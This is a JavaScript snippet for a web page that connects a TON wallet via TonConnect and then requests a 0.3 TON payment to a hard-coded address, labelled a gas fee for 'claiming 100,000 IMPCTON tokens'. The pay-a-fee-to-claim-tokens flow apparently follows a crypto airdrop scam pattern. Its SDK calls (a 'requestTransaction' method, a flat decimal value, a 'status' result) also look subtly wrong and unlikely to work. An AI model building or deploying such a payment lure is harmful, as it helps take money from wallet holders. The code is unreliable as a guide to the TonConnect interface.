// Import TonConnect
import { TonConnect } from '@tonconnect/sdk';

// Initialize TON Connect
const tonConnect = new TonConnect();

// Find the Connect Button
const connectButton = document.getElementById('tonconnect-button');

// Event listener for Connect Button
connectButton.addEventListener('click', async () => {
    connectButton.disabled = true; // Disable button to prevent multiple clicks

    try {
        console.log('Attempting to connect wallet...');
        
        // Connect to the wallet asynchronously
        await tonConnect.connect();
        console.log('Wallet connected successfully!');

        // Initiate payment once wallet is connected
        await initiatePayment();
    } catch (error) {
        console.error('Failed to connect wallet:', error);
        alert('Error connecting to wallet. Please try again.');
    } finally {
        connectButton.disabled = false; // Re-enable button after the operation
    }
});

// Function to initiate payment (0.3 TON gas fee)
async function initiatePayment() {
    const receivingAddress = 'UQCfW4ISTtreUwrUtT8ma-wIAmG3oqTw6yzVTbfYq0rMpRab'; // Your receiving TON wallet address

    try {
        const txParams = {
            to: receivingAddress, 
            value: 0.3, // 0.3 TON
            data: 'Claiming 100,000 IMPCTON tokens',
        };

        console.log('Initiating payment transaction...');
        const result = await tonConnect.requestTransaction(txParams);

        if (result.status === 'success') {
            alert('Transaction successful! You will receive 100,000 IMPCTON tokens shortly.');
        } else {
            alert('Transaction failed. Please check your wallet and try again.');
        }
    } catch (error) {
        console.error('Payment error:', error);
        alert('Payment failed. Please try again later.');
    }
}
